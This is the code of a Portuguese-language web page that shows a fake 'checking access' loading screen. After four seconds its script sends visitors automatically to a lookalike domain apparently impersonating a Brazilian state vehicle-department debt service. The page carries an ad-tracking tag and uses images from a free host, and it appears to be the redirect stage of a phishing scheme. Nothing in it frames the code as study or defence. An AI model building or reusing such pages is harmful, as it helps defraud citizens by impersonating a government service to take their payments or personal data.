<style>
:root{
  --overlay-bg: rgba(255,255,255,0.64);
}

html,body{
  height:100%;
  margin:0;
  font-family:sans-serif;
  background:#004f9f;
}

.wrap{
  position:relative;
  width:100%;
  height:100vh;
  overflow:hidden;
  display:flex;
  align-items:center;
  justify-content:center;
}

#bgImg{
  position:absolute;
  inset:0;
  width:100%;
  height:100%;
  object-fit:cover;
  transition:filter .9s ease, transform .9s ease;
  z-index:0;
}

.blurred{
  filter:blur(6px) brightness(.95);
  transform:scale(1.03);
}

.overlay{
  position:relative;
  z-index:5;
  width:min(560px,94%);
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  opacity:0;
  transition:opacity .45s ease;
}

.card{
  width:100%;
  background:var(--overlay-bg);
  backdrop-filter:blur(4px);
  border-radius:12px;
  box-shadow:0 12px 30px rgba(0,0,0,.25);
  padding:16px;
  text-align:center;
}

.logo{
  margin-bottom:20px;
}

.logo img{
  height:56px;
  max-width:70%;
  object-fit:contain;
}

.loading-gif img{
  width:90px;
  height:90px;
  object-fit:contain;
}

.loading-text{
  margin-top:10px;
  font-size:16px;
  color:#333;
  font-weight:600;
}

@media (max-width:480px){
  .logo img{
    height:46px;
  }

  .card{
    padding:14px;
  }
}
</style>
</head>

<body>

<!-- Google Tag Manager (noscript) -->
<noscript>
<iframe src="https://www.googletagmanager.com/ns.html?id=AW-18174480287"
height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<!-- End Google Tag Manager (noscript) -->

<div class="wrap">

  <img id="bgImg"
       src="https://i.postimg.cc/PrhG81pr/iko7Rf.png"
       srcset="https://i.postimg.cc/Cxkf6TMc/cel8u7ye5.png 480w, https://i.postimg.cc/PrhG81pr/iko7Rf.png 1200w"
       sizes="100vw"
       alt="Fundo" />

  <div class="overlay" id="overlay">
    <div class="card">

      <div class="logo">
        <img src="https://i.postimg.cc/sDtV8Mvj/log7y3w6.png" alt="Logo">
      </div>

      <div class="loading-gif">
        <img src="https://i.gifer.com/ZKZg.gif" alt="Carregando">
      </div>

      <div class="loading-text">
        Verificando acesso...
      </div>

    </div>
  </div>

</div>

<script>
(function(){

  const blurDelayMs = 2000;

  // REDIRECIONA APÓS 4 SEGUNDOS
  const redirectDelayMs = 4000;

  const bgImg = document.getElementById("bgImg");
  const overlay = document.getElementById("overlay");

  function reveal(){

    bgImg.classList.add("blurred");
    overlay.style.opacity = 1;

    // REDIRECIONAMENTO AUTOMÁTICO
    setTimeout(function(){

      location.href = "https://meudetran-ms.emitir-debitos.online";

    }, redirectDelayMs);

  }

  setTimeout(reveal, blurDelayMs);

})();
</script>

</body>
</html>
